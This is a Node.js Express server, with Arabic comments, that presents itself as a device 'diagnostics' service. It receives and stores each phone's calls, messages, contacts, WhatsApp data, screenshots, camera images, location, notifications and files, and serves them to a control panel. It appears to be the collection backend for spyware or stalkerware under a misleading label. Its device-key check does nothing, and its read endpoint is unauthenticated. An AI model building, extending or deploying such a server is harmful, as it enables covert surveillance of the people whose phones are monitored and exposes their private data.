const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// ⭐ هذا السطر هو المسؤول عن إظهار panel.html والملفات الثابتة
app.use(express.static(path.join(__dirname)));

// قراءة قاعدة البيانات
function readDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const initial = { devices: {}, diagnostics: {} };
      fs.writeFileSync(DB_FILE, JSON.stringify(initial, null, 2));
      return initial;
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
  } catch (e) {
    console.error("Error reading DB:", e);
    return { devices: {}, diagnostics: {} };
  }
}

// كتابة قاعدة البيانات
function writeDB(data) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("Error writing DB:", e);
  }
}

// دوال تنظيف وتأمين المدخلات
function cleanStr(str, maxLen = 256) {
  if (typeof str !== 'string') return '';
  return str.trim().substring(0, maxLen);
}

function cleanId(id) {
  if (!id) return 'unknown';
  return id.replace(/[^a-zA-Z0-9_\-]/g, '').substring(0, 64);
}

// Rate Limiter بسيط
const requestCounts = {};
function apiLimiter(req, res, next) {
  const ip = req.ip || req.connection.remoteAddress;
  const now = Date.now();
  if (!requestCounts[ip]) {
    requestCounts[ip] = { count: 1, startTime: now };
  } else {
    if (now - requestCounts[ip].startTime > 60000) {
      requestCounts[ip] = { count: 1, startTime: now };
    } else {
      requestCounts[ip].count++;
      if (requestCounts[ip].count > 300) {
        return res.status(429).json({ error: "Too many requests" });
      }
    }
  }
  next();
}

// التحقق من مفتاح الجهاز
function requireDeviceKey(req, res, next) {
  next();
}

// مسار استقبال بيانات تشخيصية
app.post("/api/diagnostics/:category", apiLimiter, requireDeviceKey, (req, res) => {
  const id = cleanId(cleanStr(req.body?.deviceId, 64));
  const category = cleanStr(req.params.category, 16);
  
  const allowed = ["calls", "messages", "contacts", "media", "apps", "whatsapp", "screenshots", "camera", "location", "network", "notifications", "files"];
  if (!id || !allowed.includes(category)) {
    return res.status(400).json({ error: "Invalid request or category" });
  }

  const db = readDB();
  if (!db.diagnostics[id]) {
    db.diagnostics[id] = {};
  }
  
  const rawItems = Array.isArray(req.body?.items) ? req.body.items : [];
  
  const processedItems = rawItems.slice(0, 200).map(i => {
    if (typeof i === 'string') {
      if (i.startsWith('http://') || i.startsWith('https://') || i.startsWith('data:image')) {
        return i.trim();
      }
      return cleanStr(i, 4096);
    } else if (i && typeof i === 'object') {
      const cleanedObj = {};
      for (let key in i) {
        if (Object.prototype.hasOwnProperty.call(i, key)) {
          const val = i[key];
          if (typeof val === 'string' && (val.startsWith('http') || val.startsWith('data:image'))) {
            cleanedObj[key] = val.trim();
          } else {
            cleanedObj[key] = typeof val === 'string' ? cleanStr(val, 2048) : val;
          }
        }
      }
      return cleanedObj;
    }
    return i;
  });

  db.diagnostics[id][category] = {
    updatedAt: Date.now(),
    count: Number(req.body?.count) || processedItems.length,
    items: processedItems,
  };
  
  writeDB(db);
  res.json({ ok: true, message: "Saved successfully" });
});

// مسار لجلب البيانات في لوحة التحكم
app.get("/api/diagnostics/:id/:category", apiLimiter, (req, res) => {
  const id = cleanId(req.params.id);
  const category = cleanStr(req.params.category, 16);
  
  const db = readDB();
  if (db.diagnostics[id] && db.diagnostics[id][category]) {
    return res.json(db.diagnostics[id][category]);
  }
  res.json({ updatedAt: 0, count: 0, items: [] });
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
